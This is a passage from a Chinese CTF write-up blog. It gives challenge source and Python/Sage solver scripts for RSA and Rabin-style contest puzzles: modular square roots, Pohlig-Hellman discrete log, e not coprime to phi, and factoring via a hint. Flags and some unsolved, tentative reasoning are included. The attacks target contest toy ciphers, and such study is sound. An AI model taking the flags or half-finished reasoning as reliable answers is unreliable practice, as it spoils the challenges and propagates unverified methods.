<p>flag{RSA_private_k3y_WHITE_GIVE}</p>
</blockquote>
<h2 id="FuckPython-RSA2（unsolved）"><a href="#FuckPython-RSA2（unsolved）" class="headerlink" title="FuckPython-RSA2（unsolved）"></a>FuckPython-RSA2（unsolved）</h2><p>端口给的和FuckPython-RSA1是一样的，不知道要干嘛，用FuckPython-RSA1的flag提交也不对</p>
<h2 id="简单的数学0"><a href="#简单的数学0" class="headerlink" title="简单的数学0"></a>简单的数学0</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5(flag).hexdigest() == <span class="string">&#x27;f9b24dfbe7d8abaab8b6a0188782eff5&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">1</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3514205322103302728670602150841765811918844361962796570872272936440995516620485389724521788163049805962351733199966478659283631463151399360865675815083685</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不是RSA已知c，p，e的题型，p不知道</p>
<p>虽然确实有个oracle检验我们的flag是否是正确的，但是不知道p我没什么思路</p>
<p>第二天附件更新，给了p，我就说哈哈哈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">8803822563647270623115855698498072941389567371514602911761887238000858306724820208054957805578533078861661091923759508072298768127983369027700000415655223</span></span><br><span class="line">p = <span class="number">12913561406317113183635547158985401377756429238562558559079682073564209000830793328430323950547190141901547099900430790186447107756095983956460182437021627</span></span><br></pre></td></tr></table></figure>

<p>直接用平方根了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">c = <span class="number">8803822563647270623115855698498072941389567371514602911761887238000858306724820208054957805578533078861661091923759508072298768127983369027700000415655223</span></span><br><span class="line">p = <span class="number">12913561406317113183635547158985401377756429238562558559079682073564209000830793328430323950547190141901547099900430790186447107756095983956460182437021627</span></span><br><span class="line">e = <span class="number">0x100000</span></span><br><span class="line">mi = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    mi.append(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    mi.append(p - <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    c = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mi:</span><br><span class="line">    t = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> md5(t).hexdigest() == <span class="string">&#x27;f9b24dfbe7d8abaab8b6a0188782eff5&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{easymathalgorithm}</p>
</blockquote>
<h2 id="简单的数学1"><a href="#简单的数学1" class="headerlink" title="简单的数学1"></a>简单的数学1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">factors = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</span><br><span class="line">power   = [<span class="number">17</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="number">2</span></span><br><span class="line">e = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">N = reduce(<span class="keyword">lambda</span> x, y: x * y,[factors[i] ** power[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))]) + <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(N) <span class="keyword">and</span> e &lt; N</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1581213514613638887702604302628425969362759</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">factors = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</span><br><span class="line">power   = [<span class="number">17</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="number">2</span></span><br><span class="line">N = reduce(<span class="keyword">lambda</span> x, y: x * y,[factors[i] ** power[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))]) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">1581213514613638887702604302628425969362759</span></span><br><span class="line">c = Mod(c, N)</span><br><span class="line">m = Mod(m, N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(discrete_log(c, m)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{you_got_ph}</p>
</blockquote>
<h2 id="困难一点点的数学0（unsolved）"><a href="#困难一点点的数学0（unsolved）" class="headerlink" title="困难一点点的数学0（unsolved）"></a>困难一点点的数学0（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">4</span>] == <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">limit</span>):</span></span><br><span class="line">    primes = [<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> primes[-<span class="number">1</span>] &lt; limit:</span><br><span class="line">        primes += [next_prime(primes[-<span class="number">1</span>])]</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">global</span> primes</span><br><span class="line">    </span><br><span class="line">    e = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    q = next_prime(q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        n *= q ** primes[randint(<span class="number">0</span>, <span class="number">5</span>)]</span><br><span class="line">        q = next_prime(q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e *= primes[randint(<span class="number">0</span>, <span class="built_in">len</span>(primes) - <span class="number">1</span>)] ** primes[randint(<span class="number">0</span>, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (n, e)</span><br><span class="line"></span><br><span class="line">primes = pre(<span class="number">100</span>)</span><br><span class="line">n, e = gen(<span class="number">2</span> ** <span class="number">128</span>)</span><br><span class="line">len_ = n.bit_length()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag + urandom((len_ &gt;&gt; <span class="number">3</span>) - <span class="built_in">len</span>(flag)))</span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">11994856154408832550226173326306706948322784186267813285424273727457277570449721708469377333295795450316798985747411428007939478275824993378444272641075595828905331211398917692117185101479077398613046411577116685482608874046448872880344276808220924860769086887940958633441714352583855540999548720044322998264846012161431636662433683276562625027092028130005970114647137832180580174041968866569822387764690463959881397320450667236461741620403395599935845735617477280364151807003271533625363666352062617204207977554178272479567385510394164676984094113453536958667301026374275130979677305822214444335545662001110540052205079456125870487695548122936396959457217914532553325619253546791069692985512699358985463221502502084675209516472887973080192751916784600603877788797705458888760552581342959043655183973152680603248917128462709597030509958883674860205970644241146476304149515438669191043736965162506814748737378119531830170603146515955648287154128232624377713379199023238511614078806426562021069638546292232028008642595243475950555611966843590609370802372713922810842109296634261927855897749685466429848085401683729949137325841031448197225286597985926477607730381020542179177937190267395728321154320663113144417493792344192501728192224067408526468047697092815734745508911899235305415196605573552817031582341240841963500082141599736527564221706520431869455796746093434293683100803464504347573705307339278622142604231243731290546424726300181230919587809100360017180646300141932273203009540779621343752276406327270280696985946756857577522536182716290889259854732662916401670054957144740292721681742707739784073111634648716873018489059318376430379543710047917376490266767875239644497833040110744093598044604501318749065110017000755265530585848590714646543215789831321305186253110749828658194624302871154167229533880360661192631336611540590753329799514109722282049242508985274973975569128167197103339329219857542511675333185438424100205435264185442625212957816223665085393904833681032006083319868956112013073947804141313761890184012761243094669629438534487954505709858329677691050279420667276012005715403824771026942764503867179041742712964566104284721980020875049780798089586557353746689141977077518535458410939575796862938638716615803650407786897854972763793186411099146552957299304020322056573695947636353479929828321017230745880492761198924142557387134524722498789054500072958840330107186959238787198423202007480930533185363864760876539962555722806312411851288978109934860380767506470800563090423502953911794718800665163227148855219153379250626032923411536090260611564327090513624773651630139865213054047971676969921132075382597029378871818496911936273603167169708274436918974731159618512856370147955309970639864283488998194291564522716718108808644500794139567941894324821270494322487330771480736023069465090696594967014241811185428807158275522064429448212412679526940639213423056138417455582473816078505889037913398303842261835933581251153905467725831957314379762137644348555546053964035105996510374509932329977348336229876173135652873412359763033310447686419768148309532098091688546115562450592460242975433396729597685387307</span></span><br><span class="line"><span class="string">6351466082405672614085883295737944548919965310077599978190541984976106721260561511854691553565453868610374663116381728992690135579603964052096888436742489466374210302988977830209354260009636769071300547671488922280932487568494617872097079900945916095578623755388259234178268680612477377610914894710907496104362972636720911428089600646222586417255348258167381366988661303295347517753632411800607422746813905818666335896482669033027140915808983428842744482539062142710596639786508537317845758580996627882525064014450135034588736834794180287554486686075596972841883555087846775677701021701479352637748421102843822406248351476994277131337482690575095175009349909732516378330382964315421709620022837911961196685966020194554189215141758762297821318628808131301398323401698864010506849785816316875321330260285263314080063147494581040037600990836748077720670885523772728159627902311960453296092752330952130969249700776559562104117567236854526041303478039102747984668480082877982578911506991928425276445385557957750379045259124494960054574534424135407768648703579640630316936268243612044686186580389257001065198441757102217761322659630686894710273768219013265353821348563879078174064695595467864392947552655739896949699714908310000268044992892911329386425950830381092394869669909772028429264943114745575587790304248788515785473427021962255432027331143994772029825798100553275968616702208346511746136952846098000483881079268476334708733720366718979528049610330304650435684527462122705466063185641405473474636409990254433154961156119876528578589683787745161026307683732723150673756819990500536505419317277397641638885910418427679382912218056162106726030182041543254191389196695732924652812425467589000461451026805090543916784702340460053504268171601901665797607174213052404647848620139395976717777302984408101541424736063698589129484369980805581194717731469528976219054596456039278307705269184407577544084520370372269984748277291765285669123103849832742912650693589627527731652063314823281800811899078839130817382422516706798968876936676146422986085568876006217756879288536420625765537735876869140624480292479927568778211793082812927301155660252404197005435807632705417486828432680003527496336100268260013505692287715197974824293602702048074200039989010466046954319001764702167525159391165221097412507207070941040169607617565907669448292394080513719952028379907211892278587213063509785161727181094780834140425449087027374354210627478929892809387327800956442381416648762382930744745836860691652645272468710801480127383690670796702340344827232853798294566232977982518551989524593975440927239406568783391313258506866750608077495352966704970278327215482373252538685185523964815393905211818152851498336930972438448603569283564012724941434639295494863634240132261738242762708931234148319337032370483580480928554288281017282842715728356865227629594590080908396457555253561758256890799884600635571737440212394730433411857064284860111226945575837832906205884951631607279348335031910003072824224574236747404904434087096197641226369055991560801425685762426000158519701843480002622016573514879915173451468691465801627597331478760735200706227052</span></span><br><span class="line"><span class="string">14338839073210349887787514275814499181389923069109753825994309046402251</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>生成n的随机数不知道，但是可以用<a href="https://blog.csdn.net/m0_49109277/article/details/117909339?spm=1001.2014.3001.5501">欧拉函数的通式</a>绕过，配上Python的Fraction库，行家啊（其实n可以完全分解的）</p>
<p>求出phi之后发现和e是不互素的，按照一般的思路e去掉<code>(e, phi)</code>，求d解出第一层；第二层e剩下$7^{11}$，而且现在<code>(e, phi)=e</code>，直接开方就不行了，有限域也直接把我sage跑挂了</p>
<p>先记下第一层的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">limit</span>):</span></span><br><span class="line">    _primes = [<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> _primes[-<span class="number">1</span>] &lt; limit:</span><br><span class="line">        _primes += [next_prime(_primes[-<span class="number">1</span>])]</span><br><span class="line">    <span class="keyword">return</span> _primes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">11994856154408832550226173326306706948322784186267813285424273727457277570449721708469377333295795450316798985747411428007939478275824993378444272641075595828905331211398917692117185101479077398613046411577116685482608874046448872880344276808220924860769086887940958633441714352583855540999548720044322998264846012161431636662433683276562625027092028130005970114647137832180580174041968866569822387764690463959881397320450667236461741620403395599935845735617477280364151807003271533625363666352062617204207977554178272479567385510394164676984094113453536958667301026374275130979677305822214444335545662001110540052205079456125870487695548122936396959457217914532553325619253546791069692985512699358985463221502502084675209516472887973080192751916784600603877788797705458888760552581342959043655183973152680603248917128462709597030509958883674860205970644241146476304149515438669191043736965162506814748737378119531830170603146515955648287154128232624377713379199023238511614078806426562021069638546292232028008642595243475950555611966843590609370802372713922810842109296634261927855897749685466429848085401683729949137325841031448197225286597985926477607730381020542179177937190267395728321154320663113144417493792344192501728192224067408526468047697092815734745508911899235305415196605573552817031582341240841963500082141599736527564221706520431869455796746093434293683100803464504347573705307339278622142604231243731290546424726300181230919587809100360017180646300141932273203009540779621343752276406327270280696985946756857577522536182716290889259854732662916401670054957144740292721681742707739784073111634648716873018489059318376430379543710047917376490266767875239644497833040110744093598044604501318749065110017000755265530585848590714646543215789831321305186253110749828658194624302871154167229533880360661192631336611540590753329799514109722282049242508985274973975569128167197103339329219857542511675333185438424100205435264185442625212957816223665085393904833681032006083319868956112013073947804141313761890184012761243094669629438534487954505709858329677691050279420667276012005715403824771026942764503867179041742712964566104284721980020875049780798089586557353746689141977077518535458410939575796862938638716615803650407786897854972763793186411099146552957299304020322056573695947636353479929828321017230745880492761198924142557387134524722498789054500072958840330107186959238787198423202007480930533185363864760876539962555722806312411851288978109934860380767506470800563090423502953911794718800665163227148855219153379250626032923411536090260611564327090513624773651630139865213054047971676969921132075382597029378871818496911936273603167169708274436918974731159618512856370147955309970639864283488998194291564522716718108808644500794139567941894324821270494322487330771480736023069465090696594967014241811185428807158275522064429448212412679526940639213423056138417455582473816078505889037913398303842261835933581251153905467725831957314379762137644348555546053964035105996510374509932329977348336229876173135652873412359763033310447686419768148309532098091688546115562450592460242975433396729597685387307</span></span><br><span class="line">c = <span class="number">6351466082405672614085883295737944548919965310077599978190541984976106721260561511854691553565453868610374663116381728992690135579603964052096888436742489466374210302988977830209354260009636769071300547671488922280932487568494617872097079900945916095578623755388259234178268680612477377610914894710907496104362972636720911428089600646222586417255348258167381366988661303295347517753632411800607422746813905818666335896482669033027140915808983428842744482539062142710596639786508537317845758580996627882525064014450135034588736834794180287554486686075596972841883555087846775677701021701479352637748421102843822406248351476994277131337482690575095175009349909732516378330382964315421709620022837911961196685966020194554189215141758762297821318628808131301398323401698864010506849785816316875321330260285263314080063147494581040037600990836748077720670885523772728159627902311960453296092752330952130969249700776559562104117567236854526041303478039102747984668480082877982578911506991928425276445385557957750379045259124494960054574534424135407768648703579640630316936268243612044686186580389257001065198441757102217761322659630686894710273768219013265353821348563879078174064695595467864392947552655739896949699714908310000268044992892911329386425950830381092394869669909772028429264943114745575587790304248788515785473427021962255432027331143994772029825798100553275968616702208346511746136952846098000483881079268476334708733720366718979528049610330304650435684527462122705466063185641405473474636409990254433154961156119876528578589683787745161026307683732723150673756819990500536505419317277397641638885910418427679382912218056162106726030182041543254191389196695732924652812425467589000461451026805090543916784702340460053504268171601901665797607174213052404647848620139395976717777302984408101541424736063698589129484369980805581194717731469528976219054596456039278307705269184407577544084520370372269984748277291765285669123103849832742912650693589627527731652063314823281800811899078839130817382422516706798968876936676146422986085568876006217756879288536420625765537735876869140624480292479927568778211793082812927301155660252404197005435807632705417486828432680003527496336100268260013505692287715197974824293602702048074200039989010466046954319001764702167525159391165221097412507207070941040169607617565907669448292394080513719952028379907211892278587213063509785161727181094780834140425449087027374354210627478929892809387327800956442381416648762382930744745836860691652645272468710801480127383690670796702340344827232853798294566232977982518551989524593975440927239406568783391313258506866750608077495352966704970278327215482373252538685185523964815393905211818152851498336930972438448603569283564012724941434639295494863634240132261738242762708931234148319337032370483580480928554288281017282842715728356865227629594590080908396457555253561758256890799884600635571737440212394730433411857064284860111226945575837832906205884951631607279348335031910003072824224574236747404904434087096197641226369055991560801425685762426000158519701843480002622016573514879915173451468691465801627597331478760735200706227052</span></span><br><span class="line">e = <span class="number">14338839073210349887787514275814499181389923069109753825994309046402251</span></span><br><span class="line">primes = pre(<span class="number">100</span>)</span><br><span class="line">q = <span class="built_in">int</span>(next_prime(<span class="number">2</span> ** <span class="number">128</span>))</span><br><span class="line">phi = Fraction(<span class="built_in">int</span>(n), <span class="built_in">int</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    phi *= Fraction(<span class="built_in">int</span>(q - <span class="number">1</span>), <span class="built_in">int</span>(q))</span><br><span class="line">    q = <span class="built_in">int</span>(next_prime(q))</span><br><span class="line"><span class="keyword">assert</span> phi.denominator == <span class="number">1</span></span><br><span class="line">phi = phi.numerator</span><br><span class="line">e2 = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> gcd(e, phi) != <span class="number">1</span>:</span><br><span class="line">    ex = gcd(e, phi)</span><br><span class="line">    e = e // ex</span><br><span class="line">    e2 *= ex</span><br><span class="line"><span class="comment"># step1</span></span><br><span class="line">d1 = invert(e, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, d1, n)</span><br></pre></td></tr></table></figure>

<p>再次去看这篇<a href="chttps://blog.csdn.net/chenzzhenguo/article/details/94339659">博客</a>，发现这位师傅写的真的好，从中又有了新的思路</p>
<p>有点像CRT凑模数，但是这道题依旧不行，因为由<code>m = bytes_to_long(flag + urandom((len_ &gt;&gt; 3) - len(flag)))</code>这句话可知，flag的位数和n是很接近的，所以几乎可以说不能把n中任何一个factor去掉</p>
<p>先记录下n的完全分解吧，也暂时不知道从何下手</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2</span></span><br><span class="line">e = <span class="number">7</span> ** <span class="number">11</span></span><br><span class="line">c = m1</span><br><span class="line">n_exponent = []</span><br><span class="line">n_factor = []</span><br><span class="line">nn = n</span><br><span class="line">q = next_prime(<span class="number">2</span> ** <span class="number">128</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    tot = <span class="number">0</span></span><br><span class="line">    <span class="comment"># if gcd(q - 1, 7) != 1:</span></span><br><span class="line">        <span class="comment"># n_exponent.append(tot)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="keyword">while</span> gcd(nn, q) != <span class="number">1</span>:</span><br><span class="line">        tot += <span class="number">1</span></span><br><span class="line">        nn = nn // q</span><br><span class="line">    n_exponent.append(tot)</span><br><span class="line">    n_factor.append(<span class="built_in">int</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;^&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(q, tot), end=<span class="string">&#x27;×&#x27;</span>)</span><br><span class="line">    q = next_prime(q)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># n = reduce(lambda x, y: x * y, [n_factor[i] ** n_exponent[i] for i in range(len(n_factor))])</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>340282366920938463463374607431768211507^2×340282366920938463463374607431768211537^13×340282366920938463463374607431768211621^13×340282366920938463463374607431768211729^11×340282366920938463463374607431768211841^7×340282366920938463463374607431768211877^7×340282366920938463463374607431768211919^11×340282366920938463463374607431768212029^2×340282366920938463463374607431768212081^2×340282366920938463463374607431768212213^13×1</p>
</blockquote>
<p>好了，做完发现才没有上次的题目，结果误闯别人萌新赛了，密码题还是挺有实在的，只是希望他们不要打我</p>
<hr>
<h1 id="2021第六届中国海洋大学信息安全竞赛"><a href="#2021第六届中国海洋大学信息安全竞赛" class="headerlink" title="2021第六届中国海洋大学信息安全竞赛"></a>2021第六届中国海洋大学信息安全竞赛</h1><h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    hint = getPrime(<span class="number">1024</span>)</span><br><span class="line">    b = getPrime(<span class="number">200</span>)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = hint * b * p + <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">64</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line"><span class="string">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line"><span class="string">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里一开始我以为是一条性质理解不了，关于整除的<br>由题目可知<br>$$<br>q=hint\times b\times p+2<br>$$<br>那么我们容易得到<br>$$<br>n=p\times q=hint\times b\times p^2+2p<br>$$<br>两边除以hint取整<br>$$<br>\lfloor n/hint\rfloor=b\times p^2+\lfloor 2p/hint\rfloor=b\times p^2+0<br>$$<br>嗯对，这里不是很懂了，整数看习惯了，对于小数有点麻了，但是通过这个，之后求p和q就简单了</p>
<p>正确的理解应该是，这并不是一条所谓性质，随便搞了几个数字就知道不对；这里的解释只能说hint和p相差太大了吧，然后只能组成$n/hint$的小数部分，所以整数部分还是完全由$b\times p^2$决定的</p>
<p>一部分代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">64</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">hint = <span class="number">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"></span><br><span class="line">bp2 = n // hint</span><br><span class="line">p = (n-hint*bp2) // <span class="number">2</span></span><br><span class="line">q = hint*bp2//p + <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br></pre></td></tr></table></figure>

<p>然后又是e是偶数的情况，不过显然没有前面遇到的那么容易和有现成的wp</p>
<h5 id="一般Rabin"><a href="#一般Rabin" class="headerlink" title="一般Rabin"></a>一般Rabin</h5><p>我的思路是多用了几个e=2的Rabin攻击，但感觉不对</p>
<p>借la师傅的脚本写了一下</p>
